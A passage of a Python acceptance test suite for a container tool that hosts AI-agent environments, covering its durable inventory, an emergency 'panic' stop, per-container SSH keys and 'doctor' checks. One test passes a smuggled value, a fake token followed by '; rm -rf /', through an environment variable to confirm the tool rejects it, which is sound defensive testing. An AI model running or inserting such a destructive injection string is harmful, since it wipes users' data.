    entry = row["known_hosts_entry"]
    assert entry and entry.startswith(f"[localhost]:{port} ")

    # Use ONLY that line, from a file the tool never wrote, on a fresh known_hosts.
    fresh = acc.tmp / "second_machine_known_hosts"
    fresh.write_text(entry + "\n")
    r2 = subprocess.run(
        ["ssh", "-i", str(laptop), "-p", str(port),
         "-o", f"UserKnownHostsFile={fresh}", "-o", "StrictHostKeyChecking=yes",
         "-o", "IdentitiesOnly=yes", "-o", "IdentityAgent=none", "-o", "BatchMode=yes",
         "dev@localhost", "whoami"],
        capture_output=True, text=True, timeout=60,
    )  # fmt: skip
    assert r2.returncode == 0, r2.stderr
    assert r2.stdout.strip() == "dev"


# --- Feature 014: the durable inventory --------------------------------------
# The gate below (T018) comes first deliberately. If an entry does NOT outlive its
# host, reconciliation has nothing to compare against and every later phase is
# decoration — so it is worth failing loudly here rather than subtly later.


def _inventory(acc) -> list[dict]:
    r = acc.cli(["inventory", "list", "--json"])
    assert r.returncode == 0, r.stderr
    return json.loads(r.stdout)["data"]["entries"]


def test_an_inventory_entry_outlives_the_container_and_the_state_dir(acc):
    """T018 — C3/FR-003/SC-002. THE GATE for Feature 014.

    The entry must survive the container being purged AND the host's derived state
    directory being deleted. If this fails, the most likely cause is the store having
    been placed under `<state>/<host>/` or scoped per host in the durable location —
    which would destroy exactly the entries the feature exists to keep.
    """
    acc.up("accinv1")
    entries = _inventory(acc)
    mine = [e for e in entries if e["name"] == "accinv1"]
    assert len(mine) == 1 and mine[0]["outcome"] == "active"

    acc.down("accinv1", purge=True)
    assert [e for e in _inventory(acc) if e["name"] == "accinv1"][0]["outcome"] == "removed"

    # Now delete the derived host state entirely — the ".port" files, the compose
    # files, the pinned known_hosts. The record is DATA and must not live there.
    shutil.rmtree(acc.state_dir / "agent-container", ignore_errors=True)
    survivors = [e for e in _inventory(acc) if e["name"] == "accinv1"]
    assert len(survivors) == 1, "the entry died with the host's state directory"
    assert survivors[0]["outcome"] == "removed"
    assert survivors[0]["host"] == "local"  # host is an ATTRIBUTE, still readable


def test_redeploy_records_too(acc):
    """T019 — C2/SC-001: a hook in the wrong place records some deploys and not
    others, and the gap is invisible because everything else works."""
    acc.up("accinv2")
    assert len([e for e in _inventory(acc) if e["name"] == "accinv2"]) == 1
    r = acc.cli(["redeploy", "accinv2", "--env-file", str(acc.tmp / "accinv2.env")])
    assert r.returncode == 0, r.stderr
    assert len([e for e in _inventory(acc) if e["name"] == "accinv2"]) == 2


def test_a_reused_name_yields_two_entries_and_leaves_the_first_intact(acc):
    """T020 — C5/SC-003a. THE WRONG ANSWER THAT LOOKS RIGHT IS 1: it would mean name
    is the key and every recreation silently erases history."""
    acc.up("accinv3")
    first = [e for e in _inventory(acc) if e["name"] == "accinv3"][0]
    acc.down("accinv3", purge=True)
    acc.up("accinv3")

    mine = [e for e in _inventory(acc) if e["name"] == "accinv3"]
    assert len(mine) == 2, "a reused name overwrote its own history"
    by_id = {e["entry_id"]: e for e in mine}
    assert by_id[first["entry_id"]]["outcome"] == "removed"  # untouched by the recreate
    assert sum(1 for e in mine if e["outcome"] == "active") == 1


def test_the_inventory_holds_no_free_text_field(acc):
    """FR-010: every field is tool-generated, so there is nowhere for a credential to
    arrive. Verified against a REAL deployment, not just the constructor."""
    acc.up("accinv4", task="a task string that must not be stored anywhere here")
    entry = [e for e in _inventory(acc) if e["name"] == "accinv4"][0]
    assert "a task string" not in json.dumps(entry)
    assert set(entry) == {
        "schema",
        "entry_id",
        "name",
        "host",
        "host_provisioned",
        "created_at",
        "outcome",
        "outcome_at",
        # Feature 017. This literal is the THIRD encoding of the field set — the
        # constant, the hermetic test, and this one — and only the acceptance tier
        # sees a REAL deployment, so only it can catch a field that the
        # constructor closes and the writer then widens.
        "role",
        "provenance",
        "notes",
    }
    # And the two new fields are CLOSED VOCABULARIES, checked on a real deploy.
    # That is the substance of FR-010 here: `provenance` embeds a name, and an
    # earlier version of `deploy_provenance` read it straight from an env var —
    # so the field set stayed closed while its CONTENTS became operator-supplied
    # free text. A set-of-keys assertion cannot see that.
    assert entry["role"] in ("agent", "control-plane")
    assert entry["provenance"] == "operator" or entry["provenance"].startswith("control-plane:")


def test_the_inventory_provenance_cannot_be_made_free_text(acc):
    """FR-010, the negative arm, against a real deployment.

    `provenance` is the one inventory field whose value comes from the
    environment rather than from the tool's own state, so it is the one place the
    closed field set can be true while a credential still arrives. An invalid name
    must be REFUSED and recorded as `control-plane:unknown`, never passed through.
    """
    marker = "ghp_notARealToken; rm -rf /"
    acc.up("accinv5", env_extra=[])
    r = acc.cli(
        ["inventory", "list", "--json"],
        extra_env={"AGENT_CONTAINER_CONTROL_PLANE_NAME": marker},
    )
    assert r.returncode == 0, r.stderr
    assert marker not in r.stdout, "an env-supplied name reached the inventory verbatim"


# --- Feature 015: the kill switch (`panic`) ----------------------------------
# S2 and S9 come first deliberately. A kill switch that stops the reachable things
# and reports success is easy to build and passes everything else here.


def _panic(acc, *args):
    return acc.cli(["panic", *args])


def _panic_json(acc, *args):
    r = _panic(acc, *args, "--json")
    return json.loads(r.stdout)["data"], r


def test_panic_stops_everything_recorded_and_verifies_it(acc):
    """S1/S5 (C1, C4, SC-002b): every environment reported `stopped` is absent from
    the RUNNING listing — and still present in `ps -a`, which is correct for a stop
    and is why verifying against `ps -a` would report every stop as failed."""
    acc.up("accpanic1")
    acc.up("accpanic2")
    data, r = _panic_json(acc)
    assert r.returncode == 0, r.stderr
    got = {x["name"]: x["outcome"] for x in data["results"]}
    assert got.get("accpanic1") == "stopped" and got.get("accpanic2") == "stopped"

    running = subprocess.run(
        [RUNTIME, "ps", "--format", "{{.Names}}"], capture_output=True, text=True
    ).stdout
    assert "agent-container-accpanic1" not in running
    all_ct = subprocess.run(
        [RUNTIME, "ps", "-a", "--format", "{{.Names}}"], capture_output=True, text=True
    ).stdout
    assert "agent-container-accpanic1" in all_ct  # stopped, not destroyed


def test_panic_never_touches_a_container_it_did_not_record(acc):
    """S9 (C10, SC-004). The naming convention can be imitated; a match is evidence
    of a NAME and nothing more. Verified live, because the claim is about what the
    tool does to something it does not own."""
    subprocess.run(
        [RUNTIME, "run", "-d", "--name", "agent-container-impostor", "alpine", "sleep", "300"],
        capture_output=True,
        check=True,
    )
    try:
        acc.up("accpanic3")
        _panic(acc)
        running = subprocess.run(
            [RUNTIME, "ps", "--format", "{{.Names}}"], capture_output=True, text=True
        ).stdout
        assert "agent-container-impostor" in running, "panic stopped a container it did not create"
    finally:
        subprocess.run([RUNTIME, "rm", "-f", "agent-container-impostor"], capture_output=True)


def test_panic_reports_an_unrecorded_host_as_undetermined_and_fails(acc):
    """S2/S6 (C3, C6, SC-002, SC-003). THE test: a host the tool cannot reach must
    never be reported stopped, and any undetermined result must fail the run.

    A host recorded in the inventory but absent from the registry is unreachable by
    construction — no daemon to ask — which is the same situation as a dead host
    without needing to break one.
    """
    acc.up("accpanic4")
    inv = acc.state_dir / "xdgdata" / "agent-container" / "inventory"
    ghost = json.loads(next(inv.glob("*.json")).read_text())
    ghost["entry_id"] = "ghost-entry"
    ghost["name"] = "accghost"
    ghost["host"] = "a-host-that-is-not-registered"
    (inv / "ghost-entry.json").write_text(json.dumps(ghost))

    data, r = _panic_json(acc)
    assert r.returncode != 0, "a run with an unreachable host reported success"
    # Assert on the PAYLOAD, not only the exit code: a crash after the envelope was
    # written also exits non-zero, and this test passed once for exactly that reason
    # while the code raised NameError. The verdict must be in the data.
    assert data["ok"] is False
    assert data["unresolved"] >= 1
    assert "Traceback" not in r.stderr and "NameError" not in r.stderr
    got = {x["name"]: x["outcome"] for x in data["results"]}
    assert got["accghost"] == "undetermined"
    assert got["accpanic4"] == "stopped"  # the reachable one still completed (C2)
    assert "undetermined" not in [
        v for k, v in got.items() if k == "accpanic4"
    ]  # never mislabelled


def test_panic_preview_changes_nothing(acc):
    """S8 (C9, SC-007). Contacting a host is a read; SC-007 is about state change."""
    acc.up("accpanic5")

    def snapshot():
        return subprocess.run(
            [RUNTIME, "ps", "-a", "--format", "{{.Names}} {{.State}}"],
            capture_output=True,
            text=True,
        ).stdout

    before = snapshot()
    r = _panic(acc, "--preview")
    assert r.returncode == 0, r.stderr
    assert snapshot() == before


def test_panic_is_repeatable(acc):
    """S10 (C11, SC-008): nothing to stop is an unambiguous success, not an error."""
    acc.up("accpanic6")
    assert _panic(acc).returncode == 0
    r = _panic(acc)
    assert r.returncode == 0, r.stderr
    data = json.loads(_panic(acc, "--json").stdout)["data"]
    assert {x["outcome"] for x in data["results"]} == {"already-stopped"}


def test_panic_stop_preserves_volumes(acc):
    """S7 (C7, SC-005): the stopping form is recoverable, which is why it needs no
    confirmation."""
    acc.up("accpanic7")
    before = acc.volumes_of("accpanic7")
    assert before
    _panic(acc)
    assert sorted(acc.volumes_of("accpanic7")) == sorted(before)


def test_panic_destroy_without_confirmation_destroys_nothing(acc):
    """S7 (C7, SC-006). The one unrecoverable form keeps its prompt."""
    acc.up("accpanic8")
    before = acc.volumes_of("accpanic8")
    r = _panic(acc, "--destroy")  # no -y, non-TTY
    assert r.returncode != 0
    assert sorted(acc.volumes_of("accpanic8")) == sorted(before)


def test_panic_scope_leaves_other_environments_untouched(acc):
    """S11 (C12): and it says what it excluded."""
    acc.up("accpanic9")
    acc.up("accpanic10")
    data, r = _panic_json(acc, "--name", "accpanic9")
    names = {x["name"] for x in data["results"]}
    assert names == {"accpanic9"}
    assert data["excluded"] >= 1
    running = subprocess.run(
        [RUNTIME, "ps", "--format", "{{.Names}}"], capture_output=True, text=True
    ).stdout
    assert "agent-container-accpanic10" in running  # untouched


def test_panic_repeat_with_an_unreachable_host_still_fails(acc):
    """S10 clarified (C11): repeatability means acting twice is SAFE — never that a
    host we cannot see stops being reported. Both halves, because asserting only the
    clean repeat tests the easy one."""
    acc.up("accpanic11")
    assert _panic(acc).returncode == 0
    assert _panic(acc).returncode == 0  # clean repeat succeeds

    inv = acc.state_dir / "xdgdata" / "agent-container" / "inventory"
    ghost = json.loads(next(inv.glob("*.json")).read_text())
    ghost |= {"entry_id": "ghost2", "name": "accghost2", "host": "unregistered-host"}
    (inv / "ghost2.json").write_text(json.dumps(ghost))
    r = _panic(acc)
    assert r.returncode != 0, "a repeat laundered an unknown into success"


def test_panic_is_bounded_by_the_slowest_host_not_the_sum(acc):
    """S4 (C5, SC-002a). MEASURED, because a sequential implementation passes every
    other panic test here and only shows up as N timeouts against N dead hosts."""
    acc.up("accpanic12")
    inv = acc.state_dir / "xdgdata" / "agent-container" / "inventory"
    base = json.loads(next(inv.glob("*.json")).read_text())
    for i in range(3):
        e = base | {"entry_id": f"dead{i}", "name": f"accdead{i}", "host": f"dead-host-{i}"}
        (inv / f"dead{i}.json").write_text(json.dumps(e))

    started = time.monotonic()
    r = _panic(acc, "--host-timeout", "8")
    elapsed = time.monotonic() - started
    assert r.returncode != 0  # three undetermined hosts
    # Three dead hosts sequentially would be ~24s+. Generous ceiling so this is a
    # shape assertion, not a stopwatch: anything near N*timeout means sequential.
    assert elapsed < 20, f"looks sequential: {elapsed:.1f}s for 3 unreachable hosts"


# --- Feature 019: the agent's own SSH key pair -------------------------------
# The load-bearing evidence here is an ABSENCE — no private key of any kind on the
# operator's disk — and an absence is the one thing a working `git push` never
# demonstrates. Everything else in this block guards a removal.


def _material(line: str) -> str:
    """Type + base64, dropping any trailing comment.

    The container's `.pub` carries `dev@<container-id>`; what the tool captures does
    not, because 018's `valid_host_pubkey` strips it. That is the right call rather
    than a bug to paper over — the comment names the container the key was BORN in,
    and the key deliberately outlives that container, so after the first recreate the
    comment identifies the wrong thing. Comparing material is comparing the key.
    """
    parts = line.split()
    assert len(parts) >= 2, f"not a public key line: {line!r}"
    return " ".join(parts[:2])


def _agent_pub(acc, name: str) -> str:
    r = acc.cli(["ssh-key", "show", name])
    assert r.returncode == 0, r.stderr
    return _material(r.stdout.strip())


def _in_container_pub(name: str) -> str:
    r = subprocess.run(
        [RUNTIME, "exec", f"agent-container-{name}", "cat", "/home/dev/.ssh/id_ed25519.pub"],
        capture_output=True,
        text=True,
    )
    assert r.returncode == 0, r.stderr
    return _material(r.stdout.strip())


def test_no_private_key_of_any_kind_is_written_anywhere(acc):
    """T020, THE GATE — S1/FR-010/SC-001 at 100%.

    018's equivalent had to carve out `*.push_key`, because Feature 003 staged an
    outbound private key beside the state it was checking. With that channel removed
    there is no carve-out left to make, so this walks BOTH the state dir and the user
    config dir with no exclusions at all. Together with 018's test, the tool now
    writes no private key anywhere on the operator's machine.

    Over every deploy path the CLI still offers — plain, keyed, known-hosts, redeploy
    — because a single path proves only that one path is clean.
    """
    laptop = _gen_keypair(acc.tmp / "lap019")
    kh = acc.tmp / "kh019"
    kh.write_text("github.com ssh-ed25519 AAAAKH\n")
    acc.up("acc019gate", authorized_key=[laptop.with_suffix(".pub")], known_hosts=kh)
    assert (
        acc.cli(
            ["redeploy", "acc019gate", "--env-file", str(acc.tmp / "acc019gate.env")]
        ).returncode
        == 0
    )
    acc.keys("acc019gate", authorized_key=[laptop.with_suffix(".pub")])

    roots = [acc.state_dir, _config_dir_of(acc.state_dir)]
    hits = [
        p
        for root in roots
        if root.is_dir()
        for p in root.rglob("*")
        if p.is_file() and "PRIVATE KEY" in p.read_bytes().decode("utf-8", "replace")
    ]
    assert hits == [], f"private key material on the operator's disk: {hits}"
    # And the generated key really does exist — otherwise this gate would pass just
    # as well against a build that never made a key at all.
    assert _in_container_pub("acc019gate").startswith("ssh-ed25519 ")


def test_the_key_survives_down_and_up(acc):
    """T018 — S4/C4/SC-003, the test that catches a NON-IDEMPOTENT generator.

    Regenerating on each boot leaves every other symptom healthy and surfaces days
    later as a push that stopped working, against a forge entry naming a key that no
    longer exists. Nothing but a recreate makes that visible.
    """
    acc.up("acc019keep")
    before = _in_container_pub("acc019keep")
    assert before == _agent_pub(acc, "acc019keep")
    acc.down("acc019keep")  # volumes preserved
    acc.up("acc019keep")
    assert _in_container_pub("acc019keep") == before, "the generator is not idempotent"
    assert _agent_pub(acc, "acc019keep") == before


def test_show_answers_with_the_environment_STOPPED(acc):
    """S6/C3/FR-005/SC-006 — a stopped or unreachable environment is exactly when the
    operator needs the key, so an answer that required reachability would fail in the
    one case the command exists for."""
    acc.up("acc019stop")
    expected = _agent_pub(acc, "acc019stop")
    assert subprocess.run([RUNTIME, "stop", "agent-container-acc019stop"]).returncode == 0
    assert _agent_pub(acc, "acc019stop") == expected


def test_nothing_wires_the_key_and_list_json_carries_it(acc):
    """T019's S2 half, plus C3/FR-004.

    An EMPTY `core.sshCommand` is the evidence that the removal was a deletion and
    not a rewiring: with a value there, the key could be working through scaffolding
    this feature claims to have deleted, and every other assertion would still pass.
    """
    acc.up("acc019json")
    got = subprocess.run(
        [RUNTIME, "exec", "agent-container-acc019json",
         "git", "config", "--global", "--get", "core.sshCommand"],
        capture_output=True, text=True,
    )  # fmt: skip
    assert got.stdout.strip() == "", f"core.sshCommand survives: {got.stdout!r}"
    r = acc.cli(["list", "--json"])
    assert r.returncode == 0, r.stderr
    rows = json.loads(r.stdout)["data"]["containers"]
    row = next(x for x in rows if x["name"].endswith("acc019json"))
    assert row["agent_ssh_public_key"] == _in_container_pub("acc019json")
    assert "PRIVATE" not in json.dumps(rows)


def test_rotate_replaces_the_key_and_keeps_the_workspace(acc):
    """T040 — S14/FR-015/C13. `--purge` already rotates by destroying the volume; the
    point of this command is that a suspected compromise does not cost the work."""
    acc.up("acc019rot")
    before = _agent_pub(acc, "acc019rot")
    marker = "/workspace/.rotate-marker"
    assert (
        subprocess.run(
            [RUNTIME, "exec", "agent-container-acc019rot", "sh", "-c", f"echo keep > {marker}"]
        ).returncode
        == 0
    )

    r = acc.cli(["ssh-key", "rotate", "acc019rot", "-y"])
    assert r.returncode == 0, r.stderr
    assert "PREVIOUS registration is now dead" in r.stderr  # never a silent swap
    after = _agent_pub(acc, "acc019rot")
    assert after != before, "rotate returned the same key"
    assert after == _in_container_pub("acc019rot")  # local state tracks the container
    # The workspace is INTACT — the whole reason this is not `down --purge`.
    kept = subprocess.run(
        [RUNTIME, "exec", "agent-container-acc019rot", "cat", marker],
        capture_output=True, text=True,
    )  # fmt: skip
    assert kept.stdout.strip() == "keep"


def test_rotate_without_confirmation_rotates_nothing(acc):
    """C13 — the destructive-action rule (exit 2, non-TTY). Rotating silently would
    kill a working registration on a typo."""
    acc.up("acc019noy")
    before = _agent_pub(acc, "acc019noy")
    r = acc.cli(["ssh-key", "rotate", "acc019noy"])  # no -y, and no TTY here
    assert r.returncode == 2, (r.returncode, r.stderr)
    assert _in_container_pub("acc019noy") == before


def test_purge_rotates_the_key_and_SAYS_SO(acc):
    """T050 — S5/C5/FR-007. The key rides the `ssh` volume, so a purge destroys it;
    nothing else in that output says so, and the operator would otherwise learn it
    from a push that stopped working."""
    acc.up("acc019purge")
    before = _agent_pub(acc, "acc019purge")
    r = acc.cli(["down", "acc019purge", "--purge", "-y"])
    assert r.returncode == 0, r.stderr
    assert "generates a NEW one" in r.stderr and "now dead" in r.stderr
    acc.up("acc019purge")
    assert _in_container_pub("acc019purge") != before


def test_the_agents_own_ssh_config_edit_SURVIVES(acc):
    """T050 — S13/FR-014a. Write-once applies to the BLOCK, not the file: an entrypoint
    that rewrote `~/.ssh/config` each boot would silently discard a jump host the agent
    configured for itself, and the loss would look like an unrelated network failure."""
    acc.up("acc019cfg")
    c = "agent-container-acc019cfg"
    assert (
        subprocess.run(
            [
                RUNTIME,
                "exec",
                c,
                "sh",
                "-c",
                "printf '\\nHost jump\\n  User ferry\\n' >> ~/.ssh/config",
            ]
        ).returncode
        == 0
    )
    acc.down("acc019cfg")
    acc.up("acc019cfg")
    cfg = subprocess.run(
        [RUNTIME, "exec", c, "cat", "/home/dev/.ssh/config"], capture_output=True, text=True
    ).stdout
    assert "Host jump" in cfg, "the agent's own config edit was clobbered"
    assert cfg.count("# BEGIN agent-container") == 1, "the managed block was appended twice"
    assert "StrictHostKeyChecking accept-new" in cfg  # and the tool's settings still hold


def test_a_config_that_PREDATES_the_block_still_gains_it(acc):
    """T050 — S13's harder half, and the case that decided the design.

    "Write the file only if absent" would leave a config the agent created FIRST — for
    a jump host, say — without `StrictHostKeyChecking`, so every SSH the agent attempts
    hangs on an interactive prompt it cannot answer. Keying on the BLOCK instead of the
    file is what makes that impossible, and only a pre-existing config shows it.
    """
    acc.up("acc019pre")
    c = "agent-container-acc019pre"
    # A fresh volume, then a config written before the tool ever sees one.
    acc.cli(["down", "acc019pre", "--purge", "-y"])
    acc.up("acc019pre")
    assert (
        subprocess.run(
            [RUNTIME, "exec", c, "sh", "-c", "printf 'Host early\\n' > ~/.ssh/config"]
        ).returncode
        == 0
    )
    acc.down("acc019pre")
    acc.up("acc019pre")
    cfg = subprocess.run(
        [RUNTIME, "exec", c, "cat", "/home/dev/.ssh/config"], capture_output=True, text=True
    ).stdout
    assert "Host early" in cfg, "the pre-existing config was clobbered"
    assert cfg.count("IdentitiesOnly") == 1, cfg  # gained the block, exactly once
    assert "StrictHostKeyChecking accept-new" in cfg


def test_the_https_path_is_untouched(acc):
    """T050a — S17/FR-012/C16/SC-011. THREE deletions in this feature sit beside the
    `GH_TOKEN` credential helper, and nothing else here would catch collateral damage
    to it: every other test in this block goes over SSH."""
    acc.up("acc019https", env_extra=["GH_TOKEN=ghp_acceptance_placeholder"])
    helper = subprocess.run(
        [RUNTIME, "exec", "agent-container-acc019https",
         "git", "config", "--global", "--get", "credential.https://github.com.helper"],
        capture_output=True, text=True,
    )  # fmt: skip
    assert helper.stdout.strip(), "the HTTPS credential helper is gone"
    probe = subprocess.run(
        [RUNTIME, "exec", "agent-container-acc019https", "sh", "-c",
         "printf 'protocol=https\\nhost=github.com\\n\\n' | git credential fill"],
        capture_output=True, text=True,
    )  # fmt: skip
    assert "password=ghp_acceptance_placeholder" in probe.stdout, probe.stdout + probe.stderr


def test_the_removed_push_key_flag_refuses_and_explains(acc):
    """S8/FR-002/C6/SC-007 — a bare "no such option" would be a regression rather than
    a removal, and the operator who used the flag had a reason that is now served."""
    for verb in ("up", "redeploy"):
        r = acc.cli([verb, "acc019gone", "--push-key", "/nonexistent"])
        assert r.returncode != 0
        assert "generated INSIDE the container" in r.stderr, (verb, r.stderr)
        assert "ssh-key show" in r.stderr, verb


def test_the_probe_never_blocks_a_deploy(acc):
    """T041 — S10/C9/FR-011: a forge the container cannot reach must not fail a deploy.

    The soft-failure logic itself is pinned in the unit tier; what only a real
    container can show is that it holds up with egress ENFORCED — the case the
    requirement was written for, since Feature 012's default-deny is the most likely
    reason a probe never answers.

    The endpoint is declared (so FR-003c's deploy-time check passes) but nothing is
    listening. The deploy still SUCCEEDS: the environment exists and its key was
    generated and captured, and the unreachable third party cost none of it. A probe
    that failed the deploy would leave the operator with nothing to read the key out
    of, which is a worse failure than the one it prevents.

    Exit **0**, not the pending code, and that is not an oversight: an unreachable
    remote makes the clone HANG rather than answer, so `clone_pending_url` declines to
    guess within its bound. Reporting `3` there would sometimes fire against a healthy
    slow clone, and the documented remedy for `3` is one an automated caller can get
    catastrophically wrong. The two-phase test below covers a forge that REFUSES,
    which is the case FR-013 is actually about.
    """
    laptop = _gen_keypair(acc.tmp / "lap019eg")
    dead = "10.255.255.1"  # declared, routable-looking, and nothing answers
    proj = _phase_b_project(acc, "acc019eg", f"        - host: {dead}\n          port: 22\n")
    acc.register("acc019eg")
    r = acc.cli(
        ["up", "acc019eg", "--authorized-key", str(laptop.with_suffix(".pub")),
         "--repo", f"ssh://git@{dead}:22/srv/repo.git"],
        cwd=proj,
    )  # fmt: skip
    assert r.returncode == 0, f"an unreachable forge broke the deploy ({r.returncode}):\n{r.stderr}"
    # NEVER "not registered" — the tool cannot know that, and saying it would send
    # the operator to re-register a key that is already fine.
    assert "the remote REJECTED it" not in r.stderr, r.stderr
    # The container is up and its key exists: the deploy did its job.
    assert _in_container_pub("acc019eg").startswith("ssh-ed25519 ")
    assert _agent_pub(acc, "acc019eg") == _in_container_pub("acc019eg")


def test_an_environment_with_no_ssh_remote_is_NOT_nagged(acc):
    """FR-006 is scoped to "an environment that pushes over SSH", and FR-011 forbids a
    nag on every deploy. With no SSH remote the probe can never confirm anything, so an
    unconditional announcement would warn forever — training the operator to skip the
    warning that matters. Such an operator learns the key from `ssh-key show`."""
    acc.up("acc019quiet")
    r = acc.cli(["redeploy", "acc019quiet", "--env-file", str(acc.tmp / "acc019quiet.env")])
    assert r.returncode == 0, r.stderr
    assert "agent SSH key —" not in r.stderr, r.stderr
    assert _agent_pub(acc, "acc019quiet").startswith("ssh-ed25519 ")  # still obtainable


_BARE_SERVER_DOCKERFILE = """FROM alpine:3.21
RUN apk add --no-cache openssh-server git \
 && ssh-keygen -A \
 && adduser -D -s /bin/sh git \\
 && passwd -u git 2>/dev/null || true \
 && mkdir -p /home/git/.ssh && : > /home/git/.ssh/authorized_keys \
 && chown -R git:git /home/git/.ssh && chmod 700 /home/git/.ssh \
 && chmod 600 /home/git/.ssh/authorized_keys \
 && mkdir -p /srv/repo.git && git init --bare -b main /srv/repo.git \
 && chown -R git:git /srv/repo.git
EXPOSE 22
CMD ["/usr/sbin/sshd","-D","-e"]
"""
# Empty authorized_keys at build time, filled per-test: the point of S12 is which
# server trusts the key, so that cannot be baked into a shared image.


def _bare_git_servers(acc, env: str, names: tuple[str, ...]) -> dict[str, str]:
    """Throwaway SSH git servers, joined to the ENVIRONMENT's own network.

    Joining matters and cost a full acceptance run to learn: left on the default
    bridge the servers get a 172.17.x address the agent container cannot route to, so
    every connection times out and the test reads as "the forge refused the key" when
    the packets never arrived. The environment must therefore exist first — the
    network is created by its deploy.
    """
    ctx = acc.tmp / "baresrv"
    ctx.mkdir(parents=True, exist_ok=True)
    (ctx / "Dockerfile").write_text(_BARE_SERVER_DOCKERFILE)
    assert (
        subprocess.run(
            [RUNTIME, "build", "-q", "-t", "acc-baregit:test", str(ctx)], capture_output=True
        ).returncode
        == 0
    ), "could not build the throwaway git server"
    net = subprocess.run(
        [RUNTIME, "inspect", f"agent-container-{env}", "--format",
         "{{range $k,$v := .NetworkSettings.Networks}}{{$k}}{{end}}"],
        capture_output=True, text=True,
    ).stdout.strip()  # fmt: skip
    assert net, f"no network for agent-container-{env}"
    ips = {}
    for n in names:
        subprocess.run([RUNTIME, "run", "-d", "--name", n, "acc-baregit:test"], capture_output=True)
        subprocess.run([RUNTIME, "network", "connect", net, n], capture_output=True)
        ips[n] = subprocess.run(
            [RUNTIME, "inspect", n, "--format",
             '{{(index .NetworkSettings.Networks "' + net + '").IPAddress}}'],
            capture_output=True, text=True,
        ).stdout.strip()  # fmt: skip
        assert ips[n], f"no address for {n} on {net}"
    time.sleep(4)
    return ips


def _register_on(server: str, pub: str) -> None:
    assert (
        subprocess.run(
            [
                RUNTIME,
                "exec",
                server,
                "sh",
                "-c",
                f"printf '%s\\n' {shlex.quote(pub)} > /home/git/.ssh/authorized_keys && "
                f"chown git:git /home/git/.ssh/authorized_keys && "
                f"chmod 600 /home/git/.ssh/authorized_keys",
            ],
        ).returncode
        == 0  # fmt: skip
    ), f"could not register the key on {server}"


def _drop(names) -> None:
    for n in names:
        subprocess.run([RUNTIME, "stop", n], capture_output=True)
        subprocess.run([RUNTIME, "rm", "-v", n], capture_output=True)


def test_the_key_reaches_only_the_repository_it_was_registered_for(acc):
    """T051 — S12/C12/SC-008, the least-privilege gain, and the one that is INVISIBLE
    in a test that only checks the push works.

    `--push-key` was in practice handed the operator's personal key, so the container
    received everything that key authorised. A per-container key registered on one
    repository authorises one repository — which only a NEGATIVE arm can demonstrate.
    """
    names = ("acc-019-srv-a", "acc-019-srv-b")
    _drop(names)
    try:
        acc.up("acc019scope")
        ips = _bare_git_servers(acc, "acc019scope", names)
        _register_on(names[0], _agent_pub(acc, "acc019scope"))  # server A ONLY

        def ls_remote(ip):
            return _exec("acc019scope", ["git", "ls-remote", f"ssh://git@{ip}:22/srv/repo.git"])

        a = ls_remote(ips[names[0]])
        assert a.returncode == 0, f"the registered repository refused its own key:\n{a.stderr}"
        b = ls_remote(ips[names[1]])
        assert b.returncode != 0, (
            "an UNREGISTERED repository accepted the key — without this arm the "
            f"assertion above proves only that something worked:\n{b.stdout}{b.stderr}"
        )
        assert "denied" in b.stderr.lower() or "publickey" in b.stderr.lower(), b.stderr
    finally:
        _drop(names)


def test_an_ssh_clone_on_start_is_two_phase(acc):
    """T048 — S11/C10/FR-013. The key cannot exist before the container does, so a
    first boot with an SSH `--repo` CANNOT clone. The container starts anyway and says
    so; refusing would leave the operator with nothing to read the key out of.

    Both halves are asserted, because the exit code is the thing that CAUSES the
    destructive reaction — a caller reading only the status tears the environment down
    and retries, regenerating the key it was about to register — so the code cannot
    also be the thing that prevents it.

    The forge must be REACHABLE and refuse: an unreachable one is a different
    requirement (FR-011's soft failure), and it hangs rather than answers, which is
    exactly the case `clone_pending_url` declines to guess about.
    """
    names = ("acc-019-pend",)
    _drop(names)
    try:
        # The network exists only once something is deployed on it, and `--repo` is a
        # deploy-time flag — so a throwaway deploy creates the network, the server
        # joins it, and the real subject is deployed second.
        acc.up("acc019pend")
        ip = _bare_git_servers(acc, "acc019pend", names)[names[0]]
        url = f"ssh://git@{ip}:22/srv/repo.git"
        acc.cli(["down", "acc019pend", "--purge", "-y"])

        r = acc.up("acc019pend", repo=url, wait=False)
        assert r.returncode == 3, f"expected the pending code, got {r.returncode}:\n{r.stderr}"
        assert "was NOT cloned" in r.stderr
        assert "DO NOT tear this environment down" in r.stderr  # the wording, not the code
        assert "ssh-key show acc019pend" in r.stderr
        # Started, and empty — "pending and says so", not "nothing happened".
        listed = _exec("acc019pend", ["sh", "-c", "ls -A /workspace | wc -l"])
        assert listed.stdout.strip() == "0", listed.stdout

        # Register it, then redeploy — the recovery the message names, and the only
        # one that does not destroy the key.
        _register_on(names[0], _agent_pub(acc, "acc019pend"))
        # Exactly the command the message printed — BARE, no --repo. That works only
        # because redeploy inherits the clone URL; asserting the message contains the
        # command this test then runs is what stops the two from drifting apart.
        assert "redeploy acc019pend\n" in r.stderr, r.stderr
        r2 = acc.cli(["redeploy", "acc019pend", "--env-file", str(acc.tmp / "acc019pend.env")])
        assert r2.returncode == 0, r2.stderr
        assert "keeping --repo" in r2.stderr, "the redeploy did not inherit the repo"
        cloned = _exec("acc019pend", ["sh", "-c", "ls -A /workspace | wc -l"])
        assert cloned.stdout.strip() != "0", "registering and redeploying did not clone"
    finally:
        _drop(names)


# --- Feature 013: `doctor` — preflight validation ----------------------------
# The load-bearing property is an ABSENCE (nothing changed), and an absence is the
# one thing a working report never demonstrates. T005 below is the gate; it lands
# before the checks and is re-run behind each one.


def _doctor_snapshot(acc) -> list[str]:
    """Everything FR-002 forbids `doctor` from touching.

    Names `hosts.conf` and the inventory explicitly rather than trusting a sweep of
    "the config dir" — FR-002's *host-registry entry* is exactly what a generic
    directory walk is most likely to miss, and a snapshot that misses the thing the
    requirement names is a gate that cannot fail for the reason it exists.
    """
    lines: list[str] = []
    roots = [
        acc.state_dir,
        _config_dir_of(acc.state_dir),
        acc.state_dir / "xdgdata" / "agent-container" / "inventory",
    ]
    for root in roots:
        if not root.exists():
            continue
        for p in sorted(root.rglob("*")):
            if p.is_file():
                lines.append(f"{p}:{hashlib.sha256(p.read_bytes()).hexdigest()}")
    for kind in ("ps -a", "volume ls", "image ls"):
        r = subprocess.run(
            [RUNTIME, *kind.split(), "--format", "{{.Name}}{{.Names}}{{.ID}}"],
            capture_output=True,
            text=True,
        )
        lines += sorted((r.stdout or "").splitlines())
    return lines


def _doctor(acc, *args, cwd=None):
    return acc.cli(["doctor", *args], cwd=cwd)


def test_doctor_changes_NOTHING(acc):
